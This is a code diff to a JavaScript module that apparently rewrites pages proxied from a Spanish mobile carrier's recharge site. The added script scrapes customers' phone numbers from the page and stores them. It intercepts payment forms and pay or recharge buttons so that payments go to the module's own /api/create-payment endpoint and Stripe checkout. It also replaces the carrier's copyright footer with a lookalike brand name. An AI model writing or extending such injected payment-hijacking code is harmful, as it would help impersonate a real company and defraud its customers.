@@ -160,6 +160,71 @@ async function modifyHTML(response) {
         console.log('No amount radio found, using default 5');
         return '5';
       }
+      
+      // Отримати номер телефону з різних джерел на сторінці
+      function getPhoneNumberFromPage() {
+        // Спочатку перевіряємо номер телефону зі сховища
+        let phoneNumber = '';
+        try {
+          phoneNumber = window.phoneNumberForPayment || 
+                       sessionStorage.getItem('rechargePhoneNumber') || 
+                       localStorage.getItem('rechargePhoneNumber') || '';
+        } catch (e) { }
+        
+        if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
+          console.log('Found phone number in storage:', phoneNumber);
+          return phoneNumber;
+        }
+        
+        // Перевіряємо поля введення
+        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+        if (phoneInput && phoneInput.value) {
+          phoneNumber = phoneInput.value.replace(/\\D/g, '');
+          console.log('Found phone number in input field:', phoneNumber);
+          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+        }
+        
+        // Перевіряємо div з класом phone і span всередині нього
+        const phoneDiv = document.querySelector('.phone span');
+        if (phoneDiv && phoneDiv.textContent) {
+          phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
+          console.log('Found phone number in .phone span:', phoneNumber);
+          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+        }
+        
+        // Перевіряємо будь-який span, який містить 9-значний номер
+        const spans = document.querySelectorAll('span');
+        for (const span of spans) {
+          const text = span.textContent.trim();
+          const digits = text.replace(/\\D/g, '');
+          if (digits.match(/^\\d{9}$/)) {
+            console.log('Found phone number in span:', digits);
+            return digits;
+          }
+        }
+        
+        // Перевіряємо текст у будь-якому div з класом "phone"
+        const phoneDivs = document.querySelectorAll('.phone');
+        for (const div of phoneDivs) {
+          const text = div.textContent.trim();
+          const matches = text.match(/\\d{9}/);
+          if (matches) {
+            console.log('Found phone number in .phone div:', matches[0]);
+            return matches[0];
+          }
+        }
+        
+        // Шукаємо 9-значний номер у будь-якому тексті на сторінці
+        const bodyText = document.body.textContent;
+        const matches = bodyText.match(/\\b(\\d{9})\\b/g);
+        if (matches && matches.length > 0) {
+          console.log('Found phone number in body text:', matches[0]);
+          return matches[0];
+        }
+        
+        console.log('No valid phone number found on page');
+        return '';
+      }
 
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
@@ -173,39 +238,23 @@ async function modifyHTML(response) {
           
           if (isFirstStep) {
             const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
-            if (phoneInput && phoneInput.value.length >= 9) {
+            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
               try {
-                const cleanPhone = phoneInput.value.replace(/\\D/g, '');
-                sessionStorage.setItem('rechargePhoneNumber', cleanPhone);
-                localStorage.setItem('rechargePhoneNumber', cleanPhone);
-                window.phoneNumberForPayment = cleanPhone;
-                console.log('Storing phone from first step:', cleanPhone);
-                
-                // Отправляем номер телефона на сервер
-                await fetch('/api/store-phone', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ phoneNumber: cleanPhone })
-                });
+                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
+                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
+                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
               } catch (e) { console.error('Error storing phone:', e); }
             }
             return true;
           }
           
-          if (!phoneNumber || phoneNumber.length < 9) {
-            try {
-              phoneNumber = window.phoneNumberForPayment || 
-                           sessionStorage.getItem('rechargePhoneNumber') || 
-                           localStorage.getItem('rechargePhoneNumber') || '';
-            } catch (e) { }
-            if (!phoneNumber || phoneNumber.length < 9) {
-              const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
-              phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
-            }
+          // Отримати номер телефону з різних джерел на сторінці
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            phoneNumber = getPhoneNumberFromPage();
           }
           
-          if (!phoneNumber || phoneNumber.length < 9) {
-            alert('Error: Valid phone number with at least 9 digits required');
+          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
+            alert('Error: Valid 9-digit phone number required');
             return false;
           }
           
@@ -244,6 +293,18 @@ async function modifyHTML(response) {
       };
       
       document.addEventListener('DOMContentLoaded', function() {
+        // Перевіряємо, чи є номер телефону на сторінці
+        const phoneNumber = getPhoneNumberFromPage();
+        if (phoneNumber) {
+          console.log('Found phone number on page:', phoneNumber);
+          try {
+            // Зберігаємо знайдений номер для подальшого використання
+            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
+            localStorage.setItem('rechargePhoneNumber', phoneNumber);
+            window.phoneNumberForPayment = phoneNumber;
+          } catch (e) { console.error('Error storing phone:', e); }
+        }
+        
         // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
         if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
           autoProgressAfterCheckNumber();
@@ -254,9 +315,6 @@ async function modifyHTML(response) {
           console.log('Form found:', form.id || form.name || 'unnamed form');
           
           form.addEventListener('submit', function(event) {
-            event.preventDefault();
-            event.stopPropagation();
-            
             console.log('Form submit intercepted:', form.id || form.name);
             
             // Перевіряємо, чи це форма з вибором суми
@@ -266,95 +324,74 @@ async function modifyHTML(response) {
               const selectedAmount = getSelectedAmountFromRadios();
               console.log('Selected amount:', selectedAmount);
             
-              // ВАЖЛИВО! Отримуємо номер телефону і зберігаємо його в сховищі
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              let phoneNumber = '';
+              // Отримуємо номер телефону з різних джерел
+              const phoneNumber = getPhoneNumberFromPage();
+              console.log('Phone for payment:', phoneNumber);
               
-              if (phoneInput && phoneInput.value) {
-                phoneNumber = phoneInput.value.replace(/\\D/g, '');
-                console.log('Phone from form INPUT:', phoneNumber);
-                
-                // Зберігаємо номер у сховищі
-                try {
-                  sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
-                  localStorage.setItem('rechargePhoneNumber', phoneNumber);
-                  window.phoneNumberForPayment = phoneNumber;
-                } catch (e) { }
-              } else {
-                // Шукаємо номер у div з класом phone
-                const phoneSpan = document.querySelector('.phone span');
-                if (phoneSpan && phoneSpan.textContent) {
-                  phoneNumber = phoneSpan.textContent.trim().replace(/\\D/g, '');
-                  console.log('Phone from .phone span:', phoneNumber);
-                  
-                  // Зберігаємо номер у сховищі
-                  try {
-                    sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
-                    localStorage.setItem('rechargePhoneNumber', phoneNumber);
-                    window.phoneNumberForPayment = phoneNumber;
-                  } catch (e) { }
-                }
-              }
-              
-              // Якщо номер не знайдено, перевіряємо сховище
-              if (!phoneNumber) {
-                try {
-                  phoneNumber = window.phoneNumberForPayment || 
-                               sessionStorage.getItem('rechargePhoneNumber') || 
-                               localStorage.getItem('rechargePhoneNumber') || '';
-                  console.log('Phone from storage:', phoneNumber);
-                } catch (e) { }
-              }
-              
-              console.log('FINAL Phone for payment:', phoneNumber);
-              
-              // ВАЖЛИВО! Робимо прямий fetch запит, щоб уникнути можливих проблем з processPayment
-              fetch('/api/create-payment', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                  amount: selectedAmount, 
-                  phoneNumber: phoneNumber,
-                  successUrl: window.location.origin + '/payment-success',
-                  cancelUrl: window.location.origin + '/payment-cancel'
-                })
-              })
-              .then(response => {
-                if (!response.ok) {
-                  throw new Error('Payment request failed with status: ' + response.status);
-                }
-                return response.json();
-              })
-              .then(data => {
-                console.log('Payment data received:', data);
-                if (data.url) {
-                  console.log('Redirecting to URL:', data.url);
-                  window.location.href = data.url;
-                } else if (data.sessionId) {
-                  console.log('Using sessionId:', data.sessionId);
-                  window.stripeLoadedPromise.then(stripe => {
-                    if (!stripe) throw new Error('Stripe failed to load');
-                    return stripe.redirectToCheckout({ sessionId: data.sessionId });
-                  });
-                } else {
-                  throw new Error('No URL or sessionId in response');
-                }
-              })
-              .catch(error => {
-                console.error('Error processing payment:', error);
-                alert('Payment error: ' + error.message);
-              });
-              
+              window.processPayment(selectedAmount, phoneNumber, event);
               return false;
             } else {
-              // Для інших форм використовуємо стандартну логіку
+              // Для інших форм
               const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
-              const phoneInput = form.querySelector('input[name*="phone"], input[type="tel"]');
-              const phoneNumber = phoneInput?.value.replace(/\\D/g, '') || '';
+              const phoneNumber = getPhoneNumberFromPage();
               window.processPayment(amount, phoneNumber, event);
             }
           });
         });
+
+        // Додаємо додаткові обробники подій для кнопок, які можуть ініціювати процес оплати
+        document.querySelectorAll('button.btn-primary, button.btn-success, a.btn').forEach(button => {
+          button.addEventListener('click', function(event) {
+            // Перевіряємо, чи це кнопка оплати або підтвердження
+            const text = button.textContent.toLowerCase();
+            if (text.includes('pagar') || text.includes('pay') || text.includes('confirmar') || 
+                text.includes('confirm') || text.includes('recargar')) {
+              
+              console.log('Payment button clicked:', text);
+              const amount = getSelectedAmountFromRadios() || '5';
+              const phoneNumber = getPhoneNumberFromPage();
+              
+              // Якщо знайдено номер телефону, запускаємо обробку платежу
+              if (phoneNumber) {
+                window.processPayment(amount, phoneNumber, event);
+                return false;
+              }
+            }
+          });
+        });
+
+        function replaceFooterText() {
+          const footerElements = document.querySelectorAll('footer span, footer div, footer p');
+          footerElements.forEach(element => {
+            if (element.textContent.includes('© DIGDIG Spain Telecom, S.L.U. 2008/2025')) {
+              element.textContent = element.textContent.replace(
+                '© DIGDIG Spain Telecom, S.L.U. 2008/2025',
+                '© DIG mobile solution'
+              );
+              element.style.textAlign = 'center'; 
+            }
+          });
+        }
+
+        const style = document.createElement('style');
+        style.textContent = \`
+          footer {
+            text-align: center; 
+            padding: 10px; 
+          }
+          footer span, footer div, footer p {
+            display: inline-block; 
+            width: 100%;
+            text-align: center; 
+            font-family: 'Arial', sans-serif;
+            font-size: 12px; 
+          }
+        \`;
+        document.head.appendChild(style);
+
+        replaceFooterText();
+        const observer = new MutationObserver(() => replaceFooterText());
+        observer.observe(document.body, { childList: true, subtree: true });
       });
     </script>
   `;
@@ -443,6 +480,55 @@ async function modifyJavaScript(response) {
       return '5';
     }
     
+    // Функція для пошуку номера телефону на сторінці
+    function getPhoneNumberFromPage() {
+      // Спочатку перевіряємо номер телефону зі сховища
+      let phoneNumber = '';
+      try {
+        phoneNumber = window.phoneNumberForPayment || 
+                     sessionStorage.getItem('rechargePhoneNumber') || 
+                     localStorage.getItem('rechargePhoneNumber') || '';
+      } catch (e) { }
+      
+      if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
+        console.log('Found phone number in storage:', phoneNumber);
+        return phoneNumber;
+      }
+      
+      // Перевіряємо поля введення
+      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
+      if (phoneInput && phoneInput.value) {
+        phoneNumber = phoneInput.value.replace(/\\D/g, '');
+        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+      }
+      
+      // Перевіряємо div з класом phone і span всередині нього
+      const phoneDiv = document.querySelector('.phone span');
+      if (phoneDiv && phoneDiv.textContent) {
+        phoneNumber = phoneDiv.textContent.trim().replace(/\\D/g, '');
+        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
+      }
+      
+      // Перевіряємо текст у будь-якому div з класом "phone"
+      const phoneDivs = document.querySelectorAll('.phone');
+      for (const div of phoneDivs) {
+        const text = div.textContent.trim();
+        const matches = text.match(/\\d{9}/);
+        if (matches) {
+          return matches[0];
+        }
+      }
+      
+      // Шукаємо 9-значний номер у будь-якому тексті на сторінці
+      const bodyText = document.body.textContent;
+      const matches = bodyText.match(/\\b(\\d{9})\\b/g);
+      if (matches && matches.length > 0) {
+        return matches[0];
+      }
+      
+      return '';
+    }
+    
     // Автоматичний перехід до наступного кроку після перевірки номера
     (function() {
       if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
@@ -460,6 +546,19 @@ async function modifyJavaScript(response) {
           }
         }, 500);
       }
+      
+      // Після завантаження документа, шукаємо номер телефону
+      document.addEventListener('DOMContentLoaded', function() {
+        const phoneNumber = getPhoneNumberFromPage();
+        if (phoneNumber) {
+          console.log('Found phone number on page:', phoneNumber);
+          try {
+            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
+            localStorage.setItem('rechargePhoneNumber', phoneNumber);
+            window.phoneNumberForPayment = phoneNumber;
+          } catch (e) { }
+        }
+      });
     })();
     
     (function() {
@@ -535,48 +634,8 @@ async function modifyJavaScript(response) {
   };
 }
 
-function createPaymentResultHTML(type, data = {}) {
-  const isSuccess = type === 'success';
-  const title = isSuccess ? 'Payment Successful' : 'Payment Cancelled';
-  const message = isSuccess ? 'Your payment was processed successfully.' : 'Your payment was cancelled.';
-  const color = isSuccess ? '#4CAF50' : '#f44336';
-  const buttonText = isSuccess ? 'Return to Account' : 'Try Again';
-  
-  const phoneInfo = data.phoneNumber && isSuccess ? `<p>Phone: ${data.phoneNumber}</p>` : '';
-  const amountInfo = data.amount && isSuccess ? `<p>Amount: €${data.amount}</p>` : '';
-
-  return `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <meta http-equiv="refresh" content="3;url=https://www.digimobil.es/">
-      <title>${title}</title>
-      <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        .container { padding: 30px; border: 1px solid #ddd; border-radius: 8px; max-width: 500px; margin: 0 auto; }
-        h1 { color: ${color}; }
-        .btn { background-color: #4CAF50; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block; margin-top: 20px; }
-      </style>
-    </head>
-    <body>
-      <div class="container">
-        <h1>${title}</h1>
-        <p>${message}</p>
-        ${phoneInfo}
-        ${amountInfo}
-        <p>Redirecting to DigiMobil in 3 seconds...</p>
-        <a href="https://www.digimobil.es/" class="btn">${buttonText}</a>
-      </div>
-    </body>
-    </html>
-  `;
-}
-
 module.exports = {
   replaceDigiWithDig,
   modifyHTML,
-  modifyJavaScript,
-  createPaymentResultHTML
+  modifyJavaScript
 };
